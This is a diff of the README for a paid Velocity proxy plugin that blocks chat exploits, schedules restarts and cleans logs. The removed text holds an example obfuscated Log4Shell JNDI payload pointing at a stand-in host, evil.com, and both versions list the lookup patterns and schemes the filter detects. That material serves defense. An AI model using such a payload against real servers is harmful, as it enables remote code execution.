@@ -1,335 +1,156 @@
 <p align="center">
-  <img src="https://img.shields.io/badge/version-2.2.1-blue?style=for-the-badge" alt="Version">
-  <img src="https://img.shields.io/badge/platform-velocity%203.3.0%2B-informational?style=for-the-badge" alt="Platform">
-  <a href="https://discord.gg/YOUR_REAL_INVITE_CODE"><img src="https://img.shields.io/badge/support-24%2F7%20discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord"></a>
-  <a href="https://mc.hypeland.org"><img src="https://img.shields.io/badge/demo-mc.hypeland.org-orange?style=for-the-badge" alt="Demo Server"></a>
+  <img src="https://img.shields.io/badge/version-2.2.3-blue?style=for-the-badge" alt="Version 2.2.3">
+  <img src="https://img.shields.io/badge/platform-velocity%203.3.0%2B-informational?style=for-the-badge" alt="Velocity 3.3.0+">
+  <img src="https://img.shields.io/badge/java-21-orange?style=for-the-badge" alt="Java 21">
+  <img src="https://img.shields.io/badge/license-proprietary-red?style=for-the-badge" alt="Proprietary license">
 </p>
 
-<h1 align="center">System-Velocity</h1>
+<h1 align="center">System Velocity</h1>
 
-<p align="center"><strong>Proxy-level security and maintenance for Velocity networks.</strong></p>
+<p align="center"><strong>Proxy-layer security &amp; maintenance for Velocity 3.3.0+ — standalone, zero dependencies</strong></p>
 
-# System-Velocity
+System Velocity is a security and maintenance plugin that runs entirely on the Velocity proxy. A single chat pipeline blocks null bytes, flooding, oversized messages, Log4Shell (CVE-2021-44228) payloads and malicious Unicode before backend servers ever see them, while a timezone-aware scheduler restarts the proxy daily and an automated cleaner keeps the proxy's `logs/` directory within retention and size limits. It is fully standalone: no backend plugin, no database, no external service.
 
-**Production-grade proxy protection for Velocity 3.3.0+ (Java 21).**
-Engineered for networks that demand multi-layer exploit defense, automated maintenance, and zero-downtime log management.
-A single JAR protects your entire proxy layer — filtering Log4Shell payloads, malicious Unicode injection, chat flooding, oversized payloads, and null-byte exploits — while scheduling automated daily restarts and keeping your log files under control. Every filter uses pre-compiled regex, lock-free data structures, and O(1) sliding-window algorithms to ensure zero impact on proxy throughput.
+> The "System" name is product-line branding — the plugin is inspired by the architecture of Hypixel's System-Proxy (inspiration only, no affiliation) and is not coupled to any backend plugin of the same family.
 
----
+## Highlights
 
-## Table of Contents
+- **Exploit defense at the proxy layer** — the chat pipeline (null-byte → flood → length → Log4Shell → Unicode) denies the first matching payload before it reaches backend servers.
+- **Deep Log4Shell detection** — case-insensitive `jndi:` matching, nested `${${lower:j}ndi:...}` brace flattening up to depth 4, dangerous-lookup patterns, payload-scheme detection (ldap, ldaps, rmi, dns, iiop, nds, nis, corba), a >4096-character anti-truncation rule, and sanitized console output so blocked payloads cannot forge logs.
+- **Unicode filtering with locale pass-through** — zero-width characters, RTL/bidi overrides and isolates, control characters and invisible look-alikes are removed with full surrogate-pair awareness, while normal Persian and Arabic text, standard punctuation and emoji pass through untouched.
+- **Violation tracking with configurable kicks** — per-player, per-type counters; Log4Shell kicks after 3 violations (default on), Unicode after 5 (default off); optional broadcast alerts to staff.
+- **Timezone-aware daily restart** — fixed HH:mm in a configurable IANA timezone (default 04:00, Asia/Tehran), with countdown warnings that survive configuration reloads.
+- **Symlink-safe log cleaner** — retention- and size-based cleanup for the proxy's own `logs/` directory; never follows or deletes symbolic links.
+- **Self-verifying** — `/systemproxy test` runs built-in Log4Shell and Unicode test cases and prints per-case PASS/FAIL results with a summary.
+- **Zero dependencies** — 10 classes, no plugin-messaging channels, no database, no external services; the only shaded library (snakeyaml) is relocated inside the jar to avoid classpath conflicts.
 
-- [Test Server – Try Before You Buy](#test-server--try-before-you-buy)
-- [Why System-Velocity?](#why-system-velocity)
-- [Competitive Comparison](#competitive-comparison)
-- [Filter Pipeline – How It Works](#filter-pipeline--how-it-works)
-- [Core Features – Expanded](#core-features--expanded)
-- [Commands & Permissions](#commands--permissions)
-- [Full Configuration](#full-configuration)
-- [Frequently Asked Questions](#frequently-asked-questions)
-- [Support & Purchasing](#support--purchasing)
+## Features
 
----
+| Feature | Description | Default |
+|---|---|---|
+| Anti-Log4Shell filter | Multi-pass analysis of CVE-2021-44228 chat payloads: `${`-syntax stripping, nested-brace flattening (depth 4), dangerous-lookup patterns, payload schemes, >4096-char anti-truncation block, sanitized console logging | Enabled, kick after 3 violations |
+| Anti-Unicode filter | Blocks zero-width, RTL/bidi and control characters plus suspicious invisibles; each malicious code point is replaced with `?` | Enabled, kick off (after 5 violations) |
+| Anti-flood filter | Sliding window admits `max-messages-per-second` × `window-seconds` messages per player; mute cooldown once breached; primitive ring buffer with zero per-message allocation | Enabled — 5 msg/s over a 3 s window, 10 s cooldown |
+| Length filter | Denies messages longer than `length-filter.max-length` | Enabled — 256 characters |
+| Null-byte filter | Runs first in the pipeline; denies any message containing `\0` | Enabled |
+| Violation tracker | Per-player totals and per-type breakdown (Log4Shell/Unicode); cleared on quit, pruned by a 5-minute sweep when that is disabled, cleared on kick and on proxy shutdown | Auto-clear on quit: on |
+| Broadcast alerts | Staff holding `systemproxy.alerts` receive a configurable `{player}`/`{type}` alert; placeholders are interpolated after legacy deserialization so crafted usernames cannot inject color codes | Off (`alerts.broadcast: false`) |
+| Daily restart scheduler | Restarts the whole proxy at a fixed time in a configurable timezone; countdown warnings at a configurable interval; countdown preserved across `/systemproxy reload`; all tasks cancelled on shutdown | Enabled — 04:00 Asia/Tehran, 60 s countdown every 15 s |
+| Log cleaner | Manages the proxy's relative `logs/` directory: deletes entries older than `retention-days` and, when the size budget is exceeded, the oldest files beyond `keep-newest`; runs async at startup and on an interval; schedule refreshed on reload | Enabled — 7 days / 500 MB / keep newest 5, check every 30 min |
+| Admin command | `/systemproxy` with aliases `/sp` and `/sysproxy`; tab completion gated by permission | `systemproxy.admin` |
+| Built-in self-tests | 6 Log4Shell cases (including nested-obfuscation variants) and 4 Unicode cases with PASS/FAIL output | On demand via `/systemproxy test` |
+| Config hardening | Defaults copied to disk on first run; malformed YAML falls back to built-in defaults; reload is atomic (both files parsed before swap); every value is typed, fallback-backed and clamped at the usage site | — |
 
-## Test Server – Try Before You Buy
+## Commands
 
-A live, fully functional demo network is available so you can evaluate System-Velocity before making any commitment.
+| Command | Permission | Description |
+|---|---|---|
+| `/systemproxy` (`/sp`, `/sysproxy`) | `systemproxy.admin` | Root admin command; no arguments prints help |
+| `/systemproxy reload` | `systemproxy.admin` | Atomically reloads `config.yml` and `messages.yml`, reschedules the daily restart and the log cleaner; an active restart countdown is preserved, never cancelled |
+| `/systemproxy status` | `systemproxy.admin` | Shows the enabled/disabled state of all five filters, the max message length, the restart time and timezone, and the log cleaner state |
+| `/systemproxy test` | `systemproxy.admin` | Runs the built-in self-tests: 6 Log4Shell and 4 Unicode cases with PASS/FAIL lines and a `{pass}`/`{fail}` summary |
+| `/systemproxy help` | `systemproxy.admin` | Prints the help message |
+| *(receive alerts)* | `systemproxy.alerts` | Not a command: players with this permission receive the broadcast alert when `alerts.broadcast` is `true` |
 
-```
-IP: mc.hypeland.org
-```
+Both permissions default to console-only unless granted through a permissions plugin.
 
-The test server runs the latest stable build with every filter enabled. You can experience the anti-exploit protection, restart scheduler, and log cleaner exactly as they would run on your own network. **No registration, no whitelist — connect and play immediately.**
+## Quick start
 
----
+1. Purchase a license at [store.hypeland.org](https://store.hypeland.org/plugins/system-velocity).
+2. Complete Discord verification — staff confirm the order personally and deliver the plugin jar to you 1:1.
+3. Drop the jar into the proxy's `plugins/` directory.
+4. Restart the proxy — `config.yml` and `messages.yml` are generated in `plugins/systemproxy/` on first start.
+5. Optionally run `/systemproxy status` and `/systemproxy test` on the console to confirm the filters and schedule.
 
-## Why System-Velocity?
+Requirements: a Velocity 3.3.0+ proxy running Java 21 or newer. Nothing else is required — the plugin installs no channels, no databases and no services, and it does not need to be (and cannot be) connected to any backend plugin.
 
-System-Velocity is not a basic chat filter strapped to a proxy. It is a purpose-built security and maintenance layer that sits between your players and your backend servers, eliminating entire classes of attacks before they ever reach Spigot.
+## Configuration
 
-### The Only Proxy Plugin That Covers Everything
-Every protection you need — Log4Shell filtering with multi-pass nested obfuscation detection, Unicode injection blocking with full code-point coverage, chat flood prevention with sliding-window algorithms, message length enforcement, and null-byte blocking — lives inside **one JAR**. You never install separate security plugins, you never configure separate filter chains, and you are never left debugging overlap conflicts between half a dozen proxy mods.
+`plugins/systemproxy/config.yml` is generated on first start; every key has a safe default and values are clamped at the usage site.
 
-### Performance as the Highest Priority
-All filter operations use pre-compiled regex patterns stored in `Pattern` constants — they are compiled once at startup and reused on every message, so there is zero regex compilation overhead at runtime. Flood tracking uses `ArrayDeque` with O(1) amortized insert and evict. Shared state uses `ConcurrentHashMap` for lock-free reads. Configuration maps are volatile for safe hot-reload. The restart scheduler is fully synchronized so reload, countdown, and shutdown operations can never interleave unsafely. The result is a plugin that adds **near-zero latency** to every chat message passing through the proxy.
+### Chat pipeline thresholds
 
-### Battle-Tested Exploit Detection
-The Log4Shell filter performs multi-pass analysis: direct JNDI lookup detection, curly-brace syntax flattening up to 4 levels deep to catch nested obfuscation like `${${lower:j}ndi:ldap://evil.com}`, dangerous lookup pattern detection, payload scheme detection (ldap, ldaps, rmi, dns, iiop, nds, nis, corba), and fail-safe handling of oversized payloads. Any message longer than 4096 characters containing lookup syntax is blocked outright, eliminating truncation-based bypasses.
+| Key | Default | Description |
+|---|---|---|
+| `flood-filter.enabled` | `true` | Enable the flood filter |
+| `flood-filter.max-messages-per-second` | `5` | Rate basis; a window admits this value × `window-seconds` messages |
+| `flood-filter.window-seconds` | `3` | Sliding-window length in seconds |
+| `flood-filter.cooldown-seconds` | `10` | Mute cooldown once flooding is detected |
+| `flood-filter.notify-player` | `true` | Tell the player the message was flood-blocked |
+| `flood-filter.log-blocked` | `true` | Log flood blocks |
+| `length-filter.enabled` | `true` | Enable the max-length filter |
+| `length-filter.max-length` | `256` | Maximum chat message length in characters |
+| `length-filter.notify-player` | `true` | Tell the player the message was too long |
+| `length-filter.log-blocked` | `true` | Log over-length blocks |
+| `null-byte-filter.enabled` | `true` | Deny messages containing a null byte (`\0`) |
 
-### Automatic Maintenance That Respects Your Players
-The daily restart scheduler uses configurable timezone-aware timing with countdown warnings at configurable lead times and intervals. An in-progress countdown is preserved when the configuration is reloaded, so a reload can never silently cancel an imminent restart. All countdown tasks are tracked and cancelled on shutdown to prevent task leaks. The log cleaner runs asynchronously on startup and on a configurable interval, deleting old logs by retention period and by total size, without ever touching symbolic links.
+### Exploit filters, kicks and alerts
 
-### Zero Recurring Costs, True Unlimited License
-One payment grants you a permanent license that covers **all proxies you own**. There are no monthly fees, no per-proxy charges, and no hidden costs.
+| Key | Default | Description |
+|---|---|---|
+| `log4shell.enabled` | `true` | Enable the Log4Shell chat filter |
+| `log4shell.notify-player` | `true` | Tell the player the message was blocked |
+| `log4shell.log-blocked` | `true` | Log blocked attempts (sanitized payload) |
+| `log4shell.kick-enabled` | `true` | Kick after repeated exploit attempts |
+| `log4shell.max-violations` | `3` | Violations before kick |
+| `unicode-filter.enabled` | `true` | Enable the Unicode injection filter |
+| `unicode-filter.notify-player` | `true` | Tell the player the message was blocked |
+| `unicode-filter.log-blocked` | `true` | Log blocked attempts (sanitized payload) |
+| `unicode-filter.kick-enabled` | `false` | Kick after repeated malicious messages (off by default) |
+| `unicode-filter.max-violations` | `5` | Violations before kick |
+| `alerts.broadcast` | `false` | Broadcast violations to `systemproxy.alerts` holders |
+| `alerts.auto-clear-violations-on-quit` | `true` | Clear violation data on disconnect; if `false`, a 5-minute sweep prunes offline players instead |
 
-### Direct Access to the Developer
-When your proxy has an issue at peak time, you do not file a ticket and wait. You speak directly to the person who wrote the code. Support is available **24/7** through Discord or Bale.
+### Daily restart schedule
 
----
+| Key | Default | Description |
+|---|---|---|
+| `restart.enabled` | `true` | Enable the daily proxy restart |
+| `restart.time` | `"04:00"` | Restart time in HH:mm within `restart.timezone`; invalid values fall back to 04:00 with a warning |
+| `restart.timezone` | `"Asia/Tehran"` | IANA ZoneId; invalid values fall back to UTC with a warning |
+| `restart.warning-seconds-before` | `60` | Countdown length in seconds; `0` restarts without warnings |
+| `restart.warning-interval-seconds` | `15` | Seconds between countdown warnings; values below 1 clamp to 1 |
 
-## Competitive Comparison
+### Log cleaner
 
-| Criteria | **System-Velocity** | VelocityScripts | TCPShield | Other "Premium" Proxy Plugins |
-|----------|---------------------|-----------------|-----------|------------------------------|
-| **Log4Shell filter** | Multi-pass (4-level nesting, 9+ schemes, 4096-char fail-safe) | Basic or none | Differently scoped (network-level) | Rare |
-| **Unicode injection filter** | Full code-point coverage (zero-width, RTL, control, surrogate pairs) | Not available | Not available | Rare |
-| **Chat flood filter** | Sliding-window O(1) with configurable window and cooldown | Basic rate limit | Not available | Varies |
-| **Null-byte filter** | Dedicated first-in-pipeline check | Not available | Not available | Rare |
-| **Violation tracker** | Per-player, per-type, periodic sweep, configurable kick | Basic | Not available | Varies |
-| **Broadcast alerts** | Staff alerts with safe placeholder interpolation | Not available | Not available | Rare |
-| **Daily restart** | Timezone-aware with preserved countdown on reload | Not available | Not available | Rare |
-| **Log cleaner** | Async, size + age based, symlink-safe, NIO.2 | Not available | Not available | Rare |
-| **Self-test system** | Built-in `/systemproxy test` for filter verification | Not available | Not available | Not available |
-| **Configuration** | YAML with malformed-file hardening and safe defaults | Varies | Web dashboard | Varies |
-| **License model** | Permanent, all proxies | Free / recurring | Free (with limits) | Often per-proxy or recurring |
+| Key | Default | Description |
+|---|---|---|
+| `log-cleaner.enabled` | `true` | Enable log management |
+| `log-cleaner.retention-days` | `7` | Delete log entries older than this |
+| `log-cleaner.max-size-mb` | `500` | Maximum total `logs/` size; a negative value disables the size pass with a warning |
+| `log-cleaner.keep-newest` | `5` | Newest files always kept during size cleanup |
+| `log-cleaner.check-interval-minutes` | `30` | Cleanup check cadence in minutes; values below 1 clamp to 1 |
 
-**Key takeaway:** System-Velocity is the only plugin that combines multi-layer exploit filtering, automated maintenance, and log management in a single JAR for your Velocity proxy — with one purchase that covers every proxy you run.
+### messages.yml
 
----
+All player- and console-facing text lives in `plugins/systemproxy/messages.yml` — filter block and kick messages, restart warnings, staff alerts, status/help/test output — with legacy `&` color codes and placeholders such as `{max}`, `{seconds}`, `{player}` and `{type}`. Every key has a hardcoded fallback, so a missing key never produces empty output. Both files reload atomically via `/systemproxy reload`; a failed or empty parse keeps the previous values.
 
-## Filter Pipeline – How It Works
+## FAQ
 
-When a player sends a chat message, the `ChatListener` processes it in the following order (first match blocks the message):
+**Does it connect to the System backend plugin?**
+No. System Velocity is fully standalone by design: the plugin descriptor declares zero dependencies, and it uses no plugin-messaging channels, Redis, MongoDB or any other backend service. It is silent about whatever backend plugins are installed, and nothing in its configuration must match anything on your servers. The shared name is product-line branding only.
 
-1. **Null-byte check** — Blocks any message containing `\0`, which can truncate strings in backend C-based parsers.
-2. **Flood check** — Sliding-window algorithm tracks message timestamps per player in an `ArrayDeque` with O(1) amortized insert and evict.
-3. **Length check** — Enforces a maximum message length (default 256 characters) to prevent oversized payload attacks.
-4. **Log4Shell exploit check** — Multi-pass analysis: direct JNDI detection, 4-level curly-brace flattening, dangerous pattern detection, 9+ scheme validation, and 4096-char fail-safe.
-5. **Unicode injection check** — Blocks zero-width characters, RTL/bidi formatting, control characters, suspicious invisible characters, with proper surrogate-pair handling.
+**What exactly happens at the daily restart?**
+At `restart.time` in `restart.timezone` the proxy broadcasts countdown warnings (60 seconds by default, one every 15 seconds), sends a final "restarting now" message, and shuts the proxy down two seconds later — your host's process manager then brings it back up. An in-progress countdown is preserved across `/systemproxy reload`, and `restart.warning-seconds-before: 0` restarts with no countdown.
 
-Each check can independently block the message, notify the player, and log the event. The Log4Shell and Unicode checks also feed into the **ViolationTracker**, which can trigger a kick after repeated violations. All shared state uses `ConcurrentHashMap` for thread-safe access without global locks.
+**Does the Unicode filter interfere with non-Latin alphabets?**
+No. The filter targets genuinely malicious code points — zero-width characters, RTL/bidi overrides and isolates, control characters and invisible look-alikes. Normal Persian and Arabic script, standard punctuation and emoji pass through untouched; malicious code points are replaced with `?`. The restart timezone is configurable as well (default Asia/Tehran), which suits international and Iranian networks alike.
 
----
+**Which platforms are supported?**
+Velocity 3.3.0+ running Java 21 or newer. It is not compatible with Paper, Spigot or BungeeCord.
 
-## Core Features – Expanded
+**Does it need a database or external services?**
+No. There is no MongoDB, Redis, SQLite or HTTP dependency; the only shaded library (snakeyaml) is relocated inside the jar. The log cleaner manages only the proxy's own relative `logs/` directory — never backend server logs or arbitrary paths.
 
-### Anti-Log4Shell Filter
+**Does it kick players for flooding or long messages?**
+No. Kick-after-violations applies only to the Log4Shell filter (enabled by default, after 3 violations) and the Unicode filter (disabled by default, after 5). Flood, length and null-byte blocks deny the individual message only.
 
-Detects and blocks Log4Shell (CVE-2021-44228) exploit attempts in chat messages. The filter performs multi-pass analysis across the entire message:
+## Links
 
-| Capability | Detail |
-|------------|--------|
-| **Direct JNDI detection** | Case-insensitive across the entire message |
-| **Nested obfuscation** | Curly-brace flattening up to 4 levels deep (e.g. `${${lower:j}ndi:ldap://...}`) |
-| **Dangerous patterns** | `lower`, `upper`, `env`, `sys`, nested braces, double-colon bypasses |
-| **Scheme detection** | ldap, ldaps, rmi, dns, iiop, nds, nis, corba |
-| **Oversized payload fail-safe** | Messages >4096 chars with lookup syntax are blocked outright |
-| **Log sanitization** | Neutralizes `${` sequences before blocked content reaches the console |
-
-### Anti-Unicode Injection Filter
-
-Blocks malicious Unicode characters used for obfuscation, spoofing, or log injection:
-
-| Category | Examples |
-|----------|---------|
-| **Zero-width characters** | U+200B, U+200C, U+200D, U+FEFF, U+2060, U+180E |
-| **RTL/bidi formatting** | U+202A–U+202E, U+200E, U+200F, U+2066–U+2069 |
-| **Control characters** | All except tab, newline, carriage return |
-| **Invisible characters** | Soft hyphen, combining grapheme joiner, Arabic letter mark, Hangul fillers, variation selectors, zero-width joiners |
-| **Surrogate pairs** | Full Unicode code point coverage for modern clients |
-
-Normal Persian, Arabic script, standard punctuation, and emoji pass through untouched.
-
-### Anti-Flood Filter
-
-Prevents chat flooding using a sliding-window algorithm with O(1) amortized complexity:
-
-- Configurable window size (default 3 seconds) and maximum messages per second (default 5).
-- Automatic cooldown period when threshold is exceeded (default 10 seconds).
-- Thread-safe per-player locking using synchronized blocks on the player's own deque.
-- Overflow-safe limit computation prevents wrap-around exploits.
-
-### Length & Null-Byte Filters
-
-- **Length filter**: Enforces maximum message length (default 256) after flood check, before exploit checks.
-- **Null-byte filter**: Blocks any message containing `\0`, running first in the pipeline.
-
-### Violation Tracker
-
-Tracks security violations per player and per type with memory-safe design:
-
-- `AtomicInteger` for thread-safe violation increments.
-- Automatic clearing on player disconnect (configurable).
-- Periodic 5-minute retention sweep bounds memory to the online player set.
-- Manual clearing via `clearAll()` on proxy shutdown.
-
-### Broadcast Alerts
-
-Optional staff alerts with safe placeholder interpolation that prevents color-code injection through crafted usernames on offline-mode proxies.
-
-### Daily Restart Scheduler
-
-- Configurable timezone (default Asia/Tehran) and time in HH:mm format (default 04:00).
-- Countdown warnings with configurable lead time and interval.
-- In-progress countdown preserved across configuration reloads.
-- All tasks tracked and cancelled on shutdown to prevent task leaks.
-
-### Log Cleaner
-
-- Runs asynchronously on startup and on a configurable interval (default 30 minutes).
-- Deletes logs older than retention period (default 7 days).
-- Size-based cleanup with configurable maximum (default 500MB) and keep-newest count (default 5).
-- Symbolic links are never created, followed, or deleted.
-- Uses NIO.2 file tree API with try-with-resources.
+- Store: [store.hypeland.org/plugins/system-velocity](https://store.hypeland.org/plugins/system-velocity)
+- Documentation: [store.hypeland.org/docs/reference/system-velocity](https://store.hypeland.org/docs/reference/system-velocity)
+- Discord: [discord.gg/kEPvGp8Yz7](https://discord.gg/kEPvGp8Yz7)
 
 ---
 
-## Commands & Permissions
-
-| Command | Description | Permission |
-|---------|-------------|------------|
-| `/systemproxy reload` | Reload configuration, reschedule restart, refresh log cleaner | `systemproxy.admin` |
-| `/systemproxy status` | Show current status of all filters | `systemproxy.admin` |
-| `/systemproxy test` | Run built-in filter self-tests (Log4Shell + Unicode) | `systemproxy.admin` |
-| `/systemproxy help` | Show help message | `systemproxy.admin` |
-
-Aliases: `/sp`, `/sysproxy` — Full tab-completion for subcommands.
-
-| Permission | Description | Default |
-|------------|-------------|--------|
-| `systemproxy.admin` | Access to all `/systemproxy` subcommands | OP only |
-| `systemproxy.alerts` | Receive broadcast alerts for violations | OP only |
-
----
-
-## Full Configuration
-
-All configuration is stored in `plugins/systemproxy/config.yml`. All player-facing messages are customizable in `plugins/systemproxy/messages.yml` with legacy ampersand color codes.
-
-### Log4Shell Filter
-
-| Key | Type | Default | Description |
-|-----|------|---------|-------------|
-| `log4shell.enabled` | boolean | `true` | Enable the Log4Shell filter |
-| `log4shell.notify-player` | boolean | `true` | Notify the player when blocked |
-| `log4shell.log-blocked` | boolean | `true` | Log blocked attempts to console |
-| `log4shell.kick-enabled` | boolean | `true` | Kick after exceeding max violations |
-| `log4shell.max-violations` | int | `3` | Violations before kick |
-
-### Unicode Filter
-
-| Key | Type | Default | Description |
-|-----|------|---------|-------------|
-| `unicode-filter.enabled` | boolean | `true` | Enable the Unicode filter |
-| `unicode-filter.notify-player` | boolean | `true` | Notify the player when blocked |
-| `unicode-filter.log-blocked` | boolean | `true` | Log blocked attempts |
-| `unicode-filter.kick-enabled` | boolean | `false` | Kick after exceeding max violations |
-| `unicode-filter.max-violations` | int | `5` | Violations before kick |
-
-### Flood Filter
-
-| Key | Type | Default | Description |
-|-----|------|---------|-------------|
-| `flood-filter.enabled` | boolean | `true` | Enable the flood filter |
-| `flood-filter.max-messages-per-second` | int | `5` | Maximum messages per second |
-| `flood-filter.window-seconds` | int | `3` | Sliding window size in seconds |
-| `flood-filter.cooldown-seconds` | int | `10` | Cooldown duration after flooding |
-| `flood-filter.notify-player` | boolean | `true` | Notify the player when blocked |
-| `flood-filter.log-blocked` | boolean | `true` | Log blocked attempts |
-
-### Length & Null-Byte Filters
-
-| Key | Type | Default | Description |
-|-----|------|---------|-------------|
-| `length-filter.enabled` | boolean | `true` | Enable the length filter |
-| `length-filter.max-length` | int | `256` | Maximum allowed message length |
-| `null-byte-filter.enabled` | boolean | `true` | Block messages containing null bytes |
-
-### Alerts
-
-| Key | Type | Default | Description |
-|-----|------|---------|-------------|
-| `alerts.broadcast` | boolean | `false` | Broadcast violations to staff |
-| `alerts.auto-clear-violations-on-quit` | boolean | `true` | Clear violation data on disconnect |
-
-### Restart Scheduler
-
-| Key | Type | Default | Description |
-|-----|------|---------|-------------|
-| `restart.enabled` | boolean | `true` | Enable daily restart |
-| `restart.time` | string | `"04:00"` | Restart time (HH:mm) |
-| `restart.timezone` | string | `"Asia/Tehran"` | Timezone for restart time |
-| `restart.warning-seconds-before` | int | `60` | Seconds of warnings before restart |
-| `restart.warning-interval-seconds` | int | `15` | Interval between warnings |
-
-### Log Cleaner
-
-| Key | Type | Default | Description |
-|-----|------|---------|-------------|
-| `log-cleaner.enabled` | boolean | `true` | Enable the log cleaner |
-| `log-cleaner.max-size-mb` | long | `500` | Maximum total log size (MB) |
-| `log-cleaner.keep-newest` | int | `5` | Newest log files to always keep |
-| `log-cleaner.retention-days` | int | `7` | Delete logs older than this |
-| `log-cleaner.check-interval-minutes` | long | `30` | Check interval in minutes |
-
----
-
-## Frequently Asked Questions
-
-### General Questions
-
-**Q: Which proxy platforms are supported?**
-A: System-Velocity is built exclusively for Velocity 3.3.0+ (Java 21). It is not compatible with BungeeCord.
-
-**Q: Does it work alongside backend anticheat plugins?**
-A: Yes. System-Velocity operates at the proxy layer, filtering chat before it reaches backend servers. It complements any backend Spigot anticheat.
-
-**Q: How does the license work?**
-A: One payment of **€5.00** grants you a permanent license that covers every proxy you own. There are no recurring fees, no per-proxy charges, and no hidden costs.
-
-**Q: Can I test the plugin before buying?**
-A: Yes. Connect to `mc.hypeland.org` to experience the full plugin on a live network.
-
-### Technical Questions
-
-**Q: What Java version does my proxy need?**
-A: Java 21 or newer.
-
-**Q: What happens if I reload the configuration during a restart countdown?**
-A: The in-progress countdown is preserved. A reload can never silently cancel an imminent restart.
-
-**Q: Does the log cleaner follow symbolic links?**
-A: No. Symbolic links are never created, followed, or deleted, so linked files outside the logs directory are always safe.
-
-**Q: How does the self-test system work?**
-A: The `/systemproxy test` command runs a suite of test cases against the Log4Shell and Unicode filters, reporting PASS/FAIL for each case and a summary at the end.
-
-### Support
-
-**Q: How do I get help if something breaks?**
-A: You have 24/7 direct access to the developer via Discord (`Nerotek01`) or Bale (`Nerotek`). There are no tickets, no forums, and no canned replies.
-
-**Q: Are updates free?**
-A: All updates for the current major version are included with your permanent license.
-
----
-
-## Support & Purchasing
-
-**System-Velocity** is a premium plugin sold exclusively by the developer.
-
-### How to Purchase
-- **Discord:** `Nerotek01`
-- **Bale (Iranian users):** `Nerotek`
-- **Price:** **€5.00** — one-time payment, permanent license.
-
-### License
-**Permanent, all-proxies license.** Your purchase covers every proxy you own. There are no recurring fees, no per-proxy charges, and no hidden costs.
-
-### What You Receive
-- The complete System-Velocity plugin JAR.
-- All security filters, fully integrated and ready to use.
-- Daily restart scheduler with timezone-aware countdown.
-- Log cleaner with async size and age management.
-- Built-in self-test system for filter verification.
-- Free updates for the current major version.
-- **24/7 priority support** via Discord or Bale.
-
-### Support Promise
-When an issue arises on your live network, you do not file tickets and hope for a reply. You speak directly with the developer — the person who wrote every line of code. Your uptime is our reputation.
-
----
-
-<p align="center">
-  <a href="https://mc.hypeland.org"><strong>Connect to the demo: mc.hypeland.org</strong></a>
-</p>
+<p align="center">© Nerotek Development. All rights reserved.</p>
